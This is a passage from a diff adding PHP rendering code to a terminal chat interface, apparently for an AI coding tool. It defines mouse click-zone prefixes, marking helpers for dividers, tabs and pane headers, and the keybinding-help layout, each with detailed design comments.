+    /**
+     * Lines of a shell `command` {@see renderInvocation()} paints before it
+     * clips - generous, because the command is the thing the user expanded
+     * the row to read; the bound exists only for a heredoc-sized script.
+     */
+    private const INVOCATION_COMMAND_MAX_LINES = 200;
+
+    /** Trailer {@see renderInput()} paints after a grayed suggestion. */
+    private static function suggestionAcceptHint(): string
+    {
+        return '  ' . Lang::t('tui.input.accept_suggestion');
+    }
+
+    /** Fewest suggestion columns worth keeping the accept hint for. */
+    private const SUGGESTION_MIN_COLS = 12;
+
+    /**
+     * Lines of any other argument value {@see renderInvocation()} paints
+     * before it clips - see that method for why these are kept short.
+     */
+    private const INVOCATION_VALUE_MAX_LINES = 8;
+
+    /**
+     * The honest trailer the live "💭 Thinking…" block prints above its
+     * rolling tail once the trace outgrows the rows it is given. sprintf
+     * args: lines shown, lines total. Public so a test pins the SAME string
+     * the renderer paints rather than a hand-copied literal.
+     *
+     * The tail - not the head - is kept for the reason E494 measured: a
+     * head-anchored bound freezes the paint, every later frame repeating the
+     * same leading text while the model keeps thinking.
+     */
+    public const THINKING_LIVE_TRAILER = 'tui.chat.thinking_trailer';
+
+    /**
+     * {@see Chat::expanded()} key of the in-flight thought once the reply has
+     * started and the thought has collapsed. Its text is still growing, so it
+     * cannot be keyed by content the way a settled one is
+     * ({@see thoughtKey()}); Chat moves an open live thought onto its content
+     * key when it lands ({@see Chat::expandedAfterLiveThought()}).
+     */
+    public const THOUGHT_LIVE_KEY = 'thought.live';
+
+    /**
+     * The collapsible thought row's visible label. The ROW is a
+     * {@see TOOL_CALL_ZONE_PREFIX} click zone sharing {@see Chat::expanded()}
+     * with tool rows, so one click mechanism opens both.
+     */
+    private const THOUGHT_ROW_LABEL = 'tui.chat.thought';
+
+    /**
+     * Rows of wrapped trace the live thinking block may paint before it
+     * keeps only the tail, given as the frame rows it leaves for everything
+     * else: the transcript is tail-clipped to the viewport anyway, so a trace
+     * painted past it is only work the terminal throws away.
+     */
+    private const THINKING_LIVE_CHROME_ROWS = 10;
+
+    /**
+     * Zone-id prefix every session tab carries (crush_feat.md §8 E2). Public
+     * because {@see Chat::update()} parses it back off a click's zone id —
+     * one literal, defined next to the code that writes it, rather than the
+     * same string spelled out independently on both sides of the hit test.
+     */
+    public const SESSION_TAB_ZONE_PREFIX = 'tab:';
+
+    /**
+     * Widest a session name may be on its tab, in cells, before it is cut with
+     * an ellipsis (audit 15b-18). Session names are free text — `/rename`
+     * stores whatever was typed — so without a per-tab cap one long name takes
+     * the whole strip and every other tab collapses into the overflow marker.
+     * 20 keeps three tabs of a typical long name visible at 80 columns; the
+     * session picker still shows each name whole.
+     */
+    private const SESSION_TAB_NAME_COLS = 20;
+
+    /**
+     * Zone-id prefix every clickable pane region carries (crush_feat.md §8
+     * E3). The suffix is always a {@see Pane} case's own `value`, so
+     * {@see Chat::update()} can turn a click straight back into the enum
+     * case rather than matching hand-spelled strings on both sides.
+     */
+    public const PANE_ZONE_PREFIX = 'pane:';
+
+    /**
+     * Click-zone prefix for one ROW of a docked side pane:
+     * `siderow:<paneId>:<key>`, where the key is the row's own — a tool
+     * call's expansion key in the Tools pane, a run id in the Agents pane.
+     * {@see \SugarCraft\Code\App\App} dispatches it (chrome, not chat).
+     */
+    public const SIDE_ROW_ZONE_PREFIX = 'siderow:';
+
+    /**
+     * One open or close zone sentinel as {@see \SugarCraft\Mouse\Mark} emits it,
+     * matched byte-wise against Mark's id charset (plus the closing `/`).
+     */
+    private const ZONE_MARKER_PATTERN = '/\xEE\x80\x80\/?[A-Za-z0-9._:-]*\xEE\x80\x81/';
+
+    /**
+     * Zone-id prefix every clickable command-palette / picker row carries
+     * (crush_feat.md §8 E6, which names `picker-item:{$index}` literally).
+     * The suffix is the row's index into {@see Chat::paletteMatches()}, i.e.
+     * exactly what {@see \SugarCraft\Code\Palette\PaletteState::$selectedIndex}
+     * holds, so a click can move the selection and then run the SAME confirm
+     * path Enter runs instead of a click-only duplicate of it.
+     */
+    public const PALETTE_ITEM_ZONE_PREFIX = 'picker-item:';
+
+    /**
+     * Session picker rows (E744 WS4). The suffix is the ABSOLUTE filtered row
+     * index the line is painted at — {@see \SugarCraft\Code\Tui\SessionPicker::rowZoneLines()}
+     * keys its map by it — so a click names exactly the row the picker would
+     * select, and the whitelist in {@see Chat::sessionRowIndex()} re-checks
+     * the same derivation rather than a second arithmetic of its own.
+     */
+    public const SESSION_ROW_ZONE_PREFIX = 'session-row:';
+
+    /**
+     * The session picker's mouse actions on the highlighted row (Appendix P
+     * §3.2): `session-act:<row>:<verb>`, one zone per glyph of the `✎ ★ ✕`
+     * cluster ({@see \SugarCraft\Code\Tui\SessionPicker::actionSegments()}),
+     * nested inside that row's `session-row:` zone. sugar-mouse registers
+     * zones in close order and the first registered wins a hit, so the inner
+     * glyph outranks the row around it. `<row>` is the same absolute row index
+     * as the row zone's, so {@see Chat::sessionRowIndex()} validates both
+     * families against one painted window; the verb is one of the cluster's.
+     */
+    public const SESSION_ACT_ZONE_PREFIX = 'session-act:';
+
+    /**
+     * Zone-id prefix every clickable tool-call row carries (crush_feat.md §8
+     * E5). The suffix is the SAME key {@see Chat::expanded()} is keyed by
+     * (`ToolResult::$id`, falling back to its name), so a click can be handed
+     * straight to {@see Chat::toggleToolOutput()} — §8 E5's note is explicit
+     * that this reuses §1 E5's expanded map rather than introducing a second
+     * expansion mechanism.
+     */
+    public const TOOL_CALL_ZONE_PREFIX = 'toolcall:';
+
+    /**
+     * Zone-id prefix every painted dock-divider CELL carries, one zone per
+     * rendered row of the divider column (`divider:<side>:r<absRow>`,
+     * pane-docking phase 2). The gesture phase hit-tests these to start a
+     * column drag; this phase only stamps them.
+     *
+     * WHY PER-ROW AND NEVER MULTI-LINE: the invariant documented on
+     * {@see markPaneHeader()} is that no zone may span lines, because
+     * `renderView()` drops whole LEADING lines under height clipping and a
+     * zone split across the drop loses its open tag: sugar-mouse's
+     * `Scan::parse()` skips the surviving orphan close and registers NO zone,
+     * so the rows still on screen go silently unclickable. One single-cell
+     * zone per row clips whole-or-not-at-all with its line, which is safe by
+     * construction.
+     */
+    public const DIVIDER_ZONE_PREFIX = 'divider:';
+
+    /**
+     * Zone-id prefix every painted intra-stack gap ROW carries
+     * (`stackdiv:<side>:<slotIndex>:r<absRow>`), where `slotIndex` is the
+     * index of the slot ABOVE the gap. The gesture phase hit-tests these to
+     * pull a stacked pane out of its slot. Same one-line-per-zone invariant
+     * as {@see DIVIDER_ZONE_PREFIX}.
+     */
+    public const STACK_DIVIDER_ZONE_PREFIX = 'stackdiv:';
+
+    /**
+     * The marked segment for one band row of a side's resize seam:
+     * `divider:<side>:r<absRow>` wrapping `$width` cells (the side box's
+     * border, any stacked divider column, and the centre's border — see
+     * {@see \SugarCraft\Code\Tui\Renderer::dividerZones()}).
+     *
+     * Returns blanks — caller paints the cells unmarked — when clicks are off,
+     * the row fell outside the frame, or the composed id would violate
+     * {@see ZONE_ID_CHARSET}; an id violation degrades to "not clickable",
+     * never to an exception from the paint path. The Tui compositor embeds
+     * the returned segment in a scanner-scratch line that never reaches the
+     * frame, mirroring how the menu bar keeps a marked and a plain render
+     * ({@see \SugarCraft\Code\Tui\Renderer::scanChrome()}).
+     */
+    public static function markDividerCell(string $sideValue, int $absRow, int $frameRows, int $width = 1): string
+    {
+        $id = self::DIVIDER_ZONE_PREFIX . $sideValue . ':r' . $absRow;
+        $blank = str_repeat(' ', max(0, $width));
+
+        if (!Chat::mouseClicksEnabled() || $absRow < 0 || $absRow >= $frameRows || $width < 1) {
+            return $blank;
+        }
+
+        if (preg_match(self::ZONE_ID_CHARSET, $id) !== 1 || strlen($id) > Mark::MAX_ID_BYTES) {
+            return $blank;
+        }
+
+        return Mark::zone($id, $blank);
+    }
+
+    /**
+     * The marked segment for one stacked side's whole intra-stack gap row:
+     * `stackdiv:<side>:<slotIndex>:r<absRow>` wrapping $width cells, where
+     * `slotIndex` is the slot ABOVE the gap. Same degrade rules — and the
+     * same one-zone-per-line invariant — as {@see markDividerCell()}.
+     */
+    public static function markStackGapRow(
+        string $sideValue,
+        int $slotIndex,
+        int $absRow,
+        int $frameRows,
+        int $width,
+    ): string {
+        $id = self::STACK_DIVIDER_ZONE_PREFIX . $sideValue . ':' . $slotIndex . ':r' . $absRow;
+
+        if (!Chat::mouseClicksEnabled() || $absRow < 0 || $absRow >= $frameRows || $width < 1) {
+            return str_repeat(' ', max(0, $width));
+        }
+
+        if (preg_match(self::ZONE_ID_CHARSET, $id) !== 1 || strlen($id) > Mark::MAX_ID_BYTES) {
+            return str_repeat(' ', $width);
+        }
+
+        return Mark::zone($id, str_repeat(' ', $width));
+    }
+
+    /**
+     * A `siderow:<paneId>:<key>` grab span of $width blanks for the scanner
+     * scratch row — or plain blanks when clicks are off or the id cannot be
+     * marked. Same validation as {@see markDockedPaneHeader()}: a key is
+     * provider- or model-authored (a tool-call id), and a bad one must cost
+     * its row the click, never the frame its zones.
+     */
+    public static function markSideRow(string $paneId, string $key, int $absRow, int $frameRows, int $width): string
+    {
+        $id = self::SIDE_ROW_ZONE_PREFIX . $paneId . ':' . $key;
+
+        if (!Chat::mouseClicksEnabled() || $absRow < 0 || $absRow >= $frameRows || $width < 1
+            || $key === '' || preg_match(self::ZONE_ID_CHARSET, $id) !== 1 || strlen($id) > Mark::MAX_ID_BYTES) {
+            return str_repeat(' ', max(0, $width));
+        }
+
+        return Mark::zone($id, str_repeat(' ', $width));
+    }
+
+    /**
+     * The marked header row of a docked pane: `pane:<paneId>` across the
+     * side block's width — the dock-drag gesture's press target. Same
+     * degrade rules and one-zone-per-line invariant as
+     * {@see markDividerCell()}.
+     *
+     * The id carries no `:r<absRow>` suffix because the whole strip is ONE
+     * press target (unlike a divider, whose every row is its own resize
+     * handle), and one zone per pane keeps {@see PANE_ZONE_PREFIX} meaning
+     * exactly one thing everywhere it is stamped: "the header of pane X".
+     */
+    public static function markDockedPaneHeader(string $paneId, int $absRow, int $frameRows, int $width): string
+    {
+        $id = self::PANE_ZONE_PREFIX . $paneId;
+
+        if (!Chat::mouseClicksEnabled() || $absRow < 0 || $absRow >= $frameRows || $width < 1) {
+            return str_repeat(' ', max(0, $width));
+        }
+
+        if (preg_match(self::ZONE_ID_CHARSET, $id) !== 1 || strlen($id) > Mark::MAX_ID_BYTES) {
+            return str_repeat(' ', $width);
+        }
+
+        return Mark::zone($id, str_repeat(' ', $width));
+    }
+
+    /**
+     * The zone-id charset {@see Mark::wrap()} accepts, duplicated here
+     * because Mark's own copy is private and it THROWS on a violation.
+     * Session ids arrive from disk (`SessionStore::listSessions()`), so an id
+     * carrying anything outside this set would take the whole TUI down from
+     * inside `view()`; {@see markSessionTab()} checks first and renders that
+     * tab unmarked (still visible, still keyboard-switchable) instead.
+     */
+    private const ZONE_ID_CHARSET = '/\A[A-Za-z0-9._:-]+\z/';
+
+    /**
+     * Zone registry the root scan pass writes into, shared across renders
+     * because a mouse event arrives *between* frames: the click handler has
+     * only the previously-painted frame's boxes to hit-test against.
+     * Mirrors bubblezone's single global manager.
+     */
+    private static ?Scanner $scanner = null;
+
+    /**
+     * Zone registry produced by the most recent {@see scanRoot()} pass.
+     * Hit-tested by {@see Chat::zoneAt()}.
+     */
+    public static function scanner(): Scanner
+    {
+        return self::$scanner ??= Scanner::new();
+    }
+
+    /**
+     * Where the scanned frame's top-left cell sits on the TERMINAL, as
+     * `[col, row]` deltas (0-based; `[0, 0]` when this renderer's frame IS
+     * the root frame).
+     *
+     * {@see scanRoot()} records zones in the coordinate space of the string it
+     * scanned, and when a shell hosts this renderer that string is a SUB-frame:
+     * {@see \SugarCraft\Code\Tui\Components\ChatPane} draws it inside a box and
+     * {@see \SugarCraft\Code\Tui\Renderer} composes that box behind a menu bar
+     * and beside a sidebar. `MouseMsg` x/y stay terminal-absolute, so without
+     * this delta every hosted click hit-tests against the wrong cell — clicks on
+     * real targets do nothing and clicks on blank chrome fire actions the user
+     * never asked for.
+     *
+     * Applied at hit-test time ({@see Chat::zoneAt()}) rather than baked into
+     * the recorded boxes because the shell only knows the final delta AFTER it
+     * has composed the frame — the frame it composes from this renderer's
+     * output. That makes it every mouse consumer's job to rebase, not just the
+     * hit-test's: `Chat` also translates the event it hands
+     * {@see \SugarCraft\Mouse\ZoneClickTracker}, which pairs a release with its
+     * press by re-testing the recorded box against that event.
+     *
+     * @var array{0: int, 1: int}
+     */
+    private static array $zoneOrigin = [0, 0];
+
+    /** @var array{0:int,1:int,2:int,3:int}|null @see selectableRegion() */
+    private static ?array $selectableRegion = null;
+
+    /** @var list<string> @see selectableLines() */
+    private static array $selectableLines = [];
+
+    /**
+     * Declare where the frame {@see scanRoot()} just scanned ended up on the
+     * terminal, in 0-based column/row deltas.
+     *
+     * Called once per frame by the shell compositor, after the composite is
+     * final. {@see scanRoot()} resets the origin to `[0, 0]` at the start of
+     * every scan, so a standalone `Chat` — and a frame the shell stops hosting
+     * — can never inherit a stale offset.
+     */
+    public static function setZoneOrigin(int $col, int $row): void
+    {
+        self::$zoneOrigin = [$col, $row];
+    }
+
+    /** @return array{0: int, 1: int} @see setZoneOrigin() */
+    public static function zoneOrigin(): array
+    {
+        return self::$zoneOrigin;
+    }
+
+    /**
+     * Whether the palette this renderer would paint is ABANDONED: open on the
+     * hosted `Chat` while a keyboard-owning shell view stands in front of it,
+     * so `Chat::update()` is not driving its next keystroke.
+     *
+     * E682 (the E12-composite carry on E666): while this is true the overlay
+     * chain skips the palette link. The ONE rule opening that chain is that
+     * the overlay on screen must be the one `Chat::update()` routes the next
+     * keystroke to — a painted-but-undrivable palette behind the F10 menu or
+     * the skill picker is exactly the ghost that rule forbids. Suppressing
+     * the paint is the composite side of the seam only; closing the abandoned
+     * palette stays at the delivery choke point
+     * ({@see \SugarCraft\Code\App\App::delegateToChat()}, E666).
+     *
+     * Like {@see setZoneOrigin()} this is computed once per frame by the shell
+     * compositor ({@see \SugarCraft\Code\App\App::view()}) from
+     * {@see \SugarCraft\Code\Tui\KeyboardHandler::paletteIsAbandoned()}, and
+     * reset on the way out — a standalone `Chat` render never sets it, so the
+     * default `false` self-heals every non-hosted path.
+     */
+    private static bool $paletteAbandoned = false;
+
+    /**
+     * Declare whether the hosted palette is abandoned for the frame being
+     * composited. Called by the shell compositor around its render, never by
+     * a standalone Chat render — see {@see self::$paletteAbandoned}.
+     */
+    public static function setPaletteAbandoned(bool $abandoned): void
+    {
+        self::$paletteAbandoned = $abandoned;
+    }
+
+    /**
+     * Whether the Agents sidepane is docked in the frame being composited
+     * (CL-2 FIX 2). The docked sidebar already lists every run, so the
+     * under-input transcript footer would paint a SECOND agent listing in
+     * the same frame — the shell suppresses the footer for that frame.
+     *
+     * Same lineage as {@see self::$paletteAbandoned}: set around one paint by
+     * {@see \SugarCraft\Code\App\App::view()} and reset on the way out, so a
+     * standalone Chat render (tests, exports) keeps the footer as its sole
+     * listing — the default `false` self-heals every non-hosted path.
+     */
+    private static bool $agentsPaneDocked = false;
+
+    /**
+     * Declare whether the Agents sidepane is docked for the frame being
+     * composited. Called by the shell compositor around its render, never by
+     * a standalone Chat render — see {@see self::$agentsPaneDocked}.
+     */
+    public static function setAgentsPaneDocked(bool $docked): void
+    {
+        self::$agentsPaneDocked = $docked;
+    }
+
+    /**
+     * The Agent View the shell has open for the frame being
+     * composited (roadmap P-C2), as {@see \SugarCraft\Code\App\App::agentViewFrame()}
+     * built it, or null for the parent transcript.
+     *
+     * The view's state is the SHELL's ({@see \SugarCraft\Code\App\App::$agentViewTarget}),
+     * not the chat's, so it reaches this renderer the way the abandonment
+     * signal above does: set around one paint by the shell compositor and
+     * reset on the way out, so a standalone Chat render never sees one.
+     *
+     * @var array{id: string, name: string, state: ?\SugarCraft\Code\Agents\Live\AgentLiveState, rows: list<Message>, composer: ?string, attach: ?\SugarCraft\Code\Tui\AgentOutputState, siblings: list<string>, transcript: bool}|null
+     */
+    private static ?array $agentView = null;
+
+    /**
+     * Declare the Agent View for the frame being composited — see
+     * {@see self::$agentView}.
+     *
+     * @param array{id: string, name: string, state: ?\SugarCraft\Code\Agents\Live\AgentLiveState, rows: list<Message>, composer: ?string, attach: ?\SugarCraft\Code\Tui\AgentOutputState, siblings: list<string>, transcript: bool}|null $view
+     */
+    public static function setAgentView(?array $view): void
+    {
+        self::$agentView = $view;
+    }
+
+    /**
+     * Drop the click-zone registry and reset the origin and the abandonment
+     * signal.
+     *
+     * For a shell frame that does NOT contain this renderer's output at all —
+     * the full-pane agent dashboard (crush_feat.md §5 E5) is the first one.
+     * {@see scanRoot()} only clears the registry when it runs, so a frame that
+     * never calls it would leave the PREVIOUS frame's boxes hit-testable
+     * underneath content that never drew them, and a click would fire whatever
+     * action last occupied that cell.
+     *
+     * `$paletteAbandoned` joins the reset for the same symmetry: App::view()'s
+     * `finally` already covers the normal path, but a compositor that dies
+     * between set and reset must leave no stale suppression behind for the
+     * next frame to inherit.
+     */
+    public static function clearZones(): void
+    {
+        self::scanner()->clear();
+        self::$selectableRegion = null;
+        self::$selectableLines = [];
+        self::$zoneOrigin = [0, 0];
+        self::$paletteAbandoned = false;
+    }
+
+    /**
+     * Tool-call rows the current frame wants clickable, collected while the
+     * transcript is built and consumed once the shell around it is drawn.
+     *
+     * This detour exists because the markers are NOT free to the layout.
+     * `Style::render()` measures every line to size the shell's border and
+     * pad the short ones, and a sentinel pair is ~29 codepoints of
+     * Private-Use text it happily counts as content: marking the label
+     * in-place (the way {@see markSessionTab()} can, being outside any box)
+     * widens the whole box by the marker length and leaves the marked row's
+     * right border ~29 columns short of every other row. Marking the row
+     * AFTER it has been measured and padded costs nothing and is what
+     * bubblezone recommends for width-sensitive containers.
+     *
+     * @var array<array-key, array{id: string, label: string}> in document order, keyed by id
+     */
+    private static array $toolCallZones = [];
+
+    /**
+     * The styled HEAD of every tool row the current frame emitted, in document
+     * order — the classification {@see fitToPane()} keys its
+     * truncate-instead-of-wrap branch off.
+     *
+     * Deliberately a SECOND list rather than a read of {@see $toolCallZones},
+     * because that one is a CLICK registry and is legitimately empty in states
+     * where clicking is impossible: {@see recordToolCallZone()} bails when
+     * {@see Chat::mouseClicksEnabled()} is false and when the model-supplied
+     * id falls outside {@see ZONE_ID_CHARSET}. Keying the LAYOUT decision off
+     * the click registry made a tool row WRAP in exactly those states —
+     * measured at 20 columns with clicks off, the row `🔧 tool: B ⊘` was
+     * followed by a lookalike `interrupted` row, which is the outcome
+     * {@see fitToPane()}'s tool-row branch exists to prevent. Two questions,
+     * two lists; this one is recorded unconditionally.
+     *
+     * @var list<string> in document order
+     */
+    private static array $toolRowHeads = [];
+
+    /**
+     * The {@see Chat::latestThoughtKey()} of the frame being built - the one
+     * thought Ctrl+O reaches, and so the only collapsed row
+     * {@see renderThought()} may advertise the chord on. Per-frame, set at the
+     * top of {@see renderView()} like the registries above.
+     */
+    private static ?string $ctrlOThoughtKey = null;
+
+    /**
+     * Palette rows the current frame wants clickable, as the FULLY rendered
+     * box lines they became (border + padding + row), collected by
+     * {@see renderPalette()} and consumed by {@see markPaletteItems()} once
+     * the palette has been composited over the frame.
+     *
+     * The detour exists because the palette is an OVERLAY, and {@see Veil}
+     * measures it: `composite()` takes the widest foreground line as the
+     * box's width and centres by it, then clips each line to the room left
+     * on its row. A sentinel pair measures ~29 columns of Private-Use text,
+     * so a row marked before compositing makes Veil believe the box is 29
+     * columns wider than it is — the whole palette shifts ~15 columns left
+     * and every row is clipped short. Marking after the composite costs
+     * nothing and leaves the geometry Veil computed untouched.
+     *
+     * @var list<array{id: string, line: string}> in row order
+     */
+    private static array $paletteItemZones = [];
+
+    /**
+     * Session picker rows the current frame wants clickable (E744 WS4), as
+     * the FULLY rendered overlay lines they became — the same pre-composite
+     * detour {@see $paletteItemZones} documents for the palette, and for the
+     * identical reason: Veil measures the overlay it is centring, and marking
+     * before the composite would move it.
+     *
+     * `acts` carries the highlighted row's action glyphs (verb => styled
+     * glyph), wrapped as `session-act:` zones inside the row's own.
+     *
+     * @var list<array{id: string, line: string, acts: array<string, string>}> in row order
+     */
+    private static array $sessionRowZones = [];
+
+    /**
+     * How many content lines the most recent frame had to drop off the top
+     * to fit the terminal — i.e. the largest {@see Chat::scrollOffset()}
+     * that still shows a full screen of transcript.
+     *
+     * Static for the same reason {@see $scanner} is: a wheel event arrives
+     * *between* frames, so the only content height it can be clamped
+     * against is the one already painted. {@see Chat} is immutable and
+     * would discard a per-instance copy of it anyway.
+     */
+    private static int $maxScrollOffset = 0;
+
+    /**
+     * Upper clamp for {@see Chat::scrollOffset()}, measured on the last
+     * rendered frame. 0 when the transcript fits the window (nothing to
+     * scroll) or when nothing has been rendered yet.
+     */
+    public static function maxScrollOffset(): int
+    {
+        return self::$maxScrollOffset;
+    }
+
+    /**
+     * Content width the keybinding reference aims for, before its own border
+     * and padding — see {@see renderKeyHelp()}. Chosen to hold the widest
+     * declared row ({@see KeyBindingRegistry}'s key column plus its longest
+     * description) without truncation on any terminal wide enough for it:
+     * measured at 58 columns (a 14-column key field for `Ctrl+Shift+Tab`, one
+     * space, and `Send, or accept the highlighted "/" command`).
+     * `KeyHelpTest::testScrollingThroughItShowsEveryLiveBinding()` is what
+     * keeps that headroom honest — it asserts every description is painted in
+     * FULL, so a row grown past this width fails rather than being clipped.
+     */
+    private const KEY_HELP_COLS = 64;
+
+    /**
+     * The keybinding reference box's own chrome, in columns: 2 border columns
+     * plus the 2 of `padding(0, 1)`. Taken off the terminal width before
+     * {@see Style::width()} is given a content width, which the box then grows
+     * past by exactly this much.
+     *
+     * NOT {@see SHELL_CHROME_COLS}, which CL-3 zeroed with the transcript
+     * shell's border; this box (like the permission prompt, which shares its
+     * `padding(1, 2)`) still paints its own. Two boxes, two paddings, two
+     * numbers — sharing one would make the reference 2 columns
+     * narrower than it can afford, and would break the moment either box's
+     * padding changed.
+     */
+    private const KEY_HELP_CHROME_COLS = 4;
+
+    /**
+     * What the status bar says when the keybinding reference is open but the
+     * window is too small to paint it ({@see keyHelpGeometry()} returns null).
+     *
+     * The whole bar, not an addition to it: the readouts it replaces are about
+     * a chat the reference is currently swallowing every keystroke for, and the
+     * bar is the one line that may not wrap.
+     *
+     * Fitted to the terminal like the bar itself (audit 15b-09): the widest of
+     * {@see KEY_HELP_TOO_SMALL_FORMS} that fits is painted, and
+     * {@see fitStatusBar()} cuts the last one on a terminal narrower than it.
+     * This cue fires on any terminal under five rows, whatever its width, so
+     * the shorter forms are reached.
+     */
+    private const KEY_HELP_TOO_SMALL = 'tui.key_help.too_small';
+
+    /**
+     * {@see KEY_HELP_TOO_SMALL} and its shorter forms, widest first. Each
+     * shorter form leads with "? closes", the one thing a user who cannot see
+     * the reference needs, so a cut keeps it.
+     */
+    private const KEY_HELP_TOO_SMALL_FORMS = [
+        self::KEY_HELP_TOO_SMALL,
+        'tui.key_help.too_small_2',
+        'tui.key_help.too_small_3',
+        'tui.key_help.closes',
+    ];
+
+    /**
+     * What the status bar says when the keybinding reference is open OVER a
+     * blocking permission prompt — the one overlay it outranks that is itself
+     * waiting on the user.
+     *
+     * Same reasoning as {@see KEY_HELP_TOO_SMALL}, applied to the same hazard:
+     * the reference wins both the slot and the keyboard (see
+     * {@see renderView()}'s chain), so the prompt is invisible AND its `y`/`n`/
+     * `a` do nothing while the turn stays `inFlight`. A modal that is invisible
+     * and silent is a stuck terminal as far as the user can tell, so the bar
+     * says the prompt is there and `?` is what gets to it.
+     *
+     * The whole bar, fitted to the terminal the same way (audit 15b-09): the
+     * widest of {@see KEY_HELP_OVER_PROMPT_FORMS} that fits, then the cut. It
+     * used to be held SHORTER than the in-flight bar it replaces (35 against
+     * 36 columns) because the bar was never truncated; now every bar and both
+     * cues are held to `$cols` directly, which
+     * `KeyHelpTest::testTheCuesFitTheTerminalInEveryAppState()`
+     * sweeps over app states and terminal sizes.
+     *
+     * Its width is a COLUMN count, not a byte count: `strlen` reads this cue
+     * as 36 where `Width::of()` reads 35.
+     *
+     * Lang keys (audit 15b-14), like every form below: the forms are
+     * resolved per frame ({@see translated()}) and fitted by display width,
+     * so a translated cue still cannot overflow the row — {@see fitStatusBar()}
+     * measures the rendered string.
+     */
+    private const KEY_HELP_OVER_PROMPT = 'tui.key_help.over_prompt';
+
+    /** {@see KEY_HELP_OVER_PROMPT} and its shorter forms, widest first, as {@see KEY_HELP_TOO_SMALL_FORMS}. */
+    private const KEY_HELP_OVER_PROMPT_FORMS = [
+        self::KEY_HELP_OVER_PROMPT,
+        'tui.key_help.over_prompt_2',
+        'tui.key_help.over_prompt_3',
+        'tui.key_help.closes',
+    ];
+
+    /**
+     * The status bar's read-only marker ({@see readOnlyMarker()}), widest
+     * first, each carrying its own trailing separator. The long form names
+     * the way out, `/branch`, which is the one thing the read-only notice
+     * says that the marker would otherwise lose once it scrolls away.
+     */
+    private const READ_ONLY_MARKER_FORMS = [
+        'tui.status.read_only_long',
+        'tui.status.read_only',
+        'tui.status.read_only_short',
+    ];
+
+    /**
+     * Lang keys resolved in order, for the form lists above.
+     *
+     * @param list<string> $keys
+     * @return list<string>
+     */
+    private static function translated(array $keys): array
+    {
+        return array_map(static fn (string $key): string => Lang::t($key), $keys);
+    }
+
+    /**
+     * The narrowest room the model segment ({@see modelIndicator()}) is
+     * ellipsised into rather than dropped: five columns of an id and the
+     * ellipsis. Narrower, the stub names no model anyone could recognise.
+     */
+    private const MODEL_SEGMENT_MIN_COLS = 6;
+
+    /**
+     * How far the LAST rendered keybinding reference overflowed its box,
+     * in lines. Static for the same reason {@see $maxScrollOffset} is: the
+     * keystroke that scrolls arrives between frames, so the only content
+     * height it can be clamped against is the one already painted.
+     *
+     * Process-global and read by production code ({@see Chat::withKeyHelp()}
+     * clamps against it), which is the shape of the three statics this feature's
+     * review round had to add resets for — and it needs no reset seam, for a
+     * reason that is a property rather than a habit: {@see renderKeyHelp()} runs
+     * FIRST in {@see renderView()}'s overlay chain, so it runs on every frame
+     * THIS renderer paints, and its two early returns (reference closed, or box
+     * does not fit) both zero this before returning ''. One such frame therefore
+     * clears it, which is asserted rather than assumed, by
+     * `KeyHelpTest::testTheOverflowCeilingResetsItselfOnAFrameWithoutTheReference()`.
+     *
+     * "Every frame this renderer paints" is the honest bound, not "every frame":
+     * under the pane shell, `Pane::Agents` builds a bespoke frame that never
+     * enters this chain (`Tui\Renderer::renderAgentDashboard()`), so painted
+     * frames exist that leave the ceiling alone. The conclusion survives on a
+     * second guarantee rather than on this one — nothing in that pane can reach a
+     * `withKeyHelp()` call at all. Swept, rather than argued: over the 95
+     * printable runes x Ctrl on/off plus the nine named keys x Ctrl on/off,
+     * `KeyboardHandler::claims()` in `Pane::Agents` lets exactly SEVEN chords
+     * through to `Chat` — `Ctrl+A`, `Ctrl+C`, `Ctrl+O`, `Ctrl+P`, `Ctrl+V`,
+     * `Ctrl+W`, `Ctrl+Tab` — and none of the seven is a `withKeyHelp()` caller:
+     * they dispatch `/agents`, quit, toggle a tool's output, open the palette,
+     * attach the clipboard image, delete a word and cycle sessions. Both routes to the reference are claimed by the shell
+     * there: `?` (unmodified, so rule 2 takes it) and `Enter`, without which
+     * `submit()`'s `/keys` arm is unreachable too. And {@see renderKeyHelp()}
+     * re-clamps `$start` against a freshly measured ceiling regardless.
+     *
+     * A stale value can therefore only be READ between a frame that painted the
+     * reference and a `withKeyHelp()` call with no frame in between.
+     */
+    private static int $keyHelpMaxOffset = 0;
+
+    /**
+     * Upper clamp for {@see Chat::keyHelp()}, measured on the last rendered
+     * reference. 0 when the whole list fits, or when it has never been drawn.
+     */
+    public static function keyHelpMaxOffset(): int
+    {
+        return self::$keyHelpMaxOffset;
+    }
+
+    /**
+     * The reference box's `[contentWidth, boxRows]` for this terminal, or null
+     * when it does not fit and must not be drawn at all.
+     *
+     * Neither bound has a floor, and that is deliberate in both directions:
+     *
+     * - width: {@see Style::width()} sets the CONTENT width and the box grows
+     *   past it by {@see KEY_HELP_CHROME_COLS}. A floor would produce a
+     *   five-column box on a four-column terminal, and one column over is
+     *   still an over-wide frame line — the absolute-cursorTo row collision
+     *   {@see renderView()}'s tail clip exists to prevent.
+     * - height: the box may never be taller than `rows - 2`. Veil composites
+     *   the overlay without truncating the row underneath, and the status bar
+     *   on the last row is deliberately not width-truncated
+     *   ({@see renderStatusBar()}) — so a box that reached that row would cover
+     *   its first `$width` columns and leave the rest of the bar hanging past
+     *   the box's right edge. A floor that let the box grow into those rows on
+     *   a very short terminal is exactly what once made that happen.
+     *
+     * So a terminal under 5 columns or under 5 rows gets no box. Read by
+     * {@see renderKeyHelp()} to size it and by {@see renderStatusBar()} to
+     * decide whether the reference needs announcing in words instead.
+     *
+     * @return array{0: int, 1: int}|null
+     */
+    private static function keyHelpGeometry(Chat $chat): ?array
+    {
+        $width = min(self::KEY_HELP_COLS, $chat->cols() - self::KEY_HELP_CHROME_COLS);
+        $boxRows = $chat->rows() - 2;
+
+        return $width < 1 || $boxRows < 3 ? null : [$width, $boxRows];
+    }
+
+    /**
+     * The zone-scan pass, run exactly ONCE per frame and only at the root.
+     *
+     * sugar-mouse (like bubblezone) records absolute bounding boxes as it
+     * walks the string, so scanning a sub-widget's output would register
+     * boxes relative to that widget's own origin rather than the terminal's
+     * — every nested scan would have to be thrown away and redone here
+     * anyway. Scanning after the last compositing step (including the
+     * palette overlay) is therefore both the cheapest and the only correct
+     * placement.
+     *
+     * "Root" is this renderer's own frame, which is the terminal's root only
+     * while `Chat` runs standalone. When the pane shell hosts it the frame is
+     * a sub-frame, and re-scanning the composed shell frame instead is not an
+     * option: the markers are ~29 Private-Use cells that
+     * `Style::render()`/`Layout::joinHorizontal()`/{@see
+     * \SugarCraft\Code\Tui\Renderer} would all measure as content, breaking
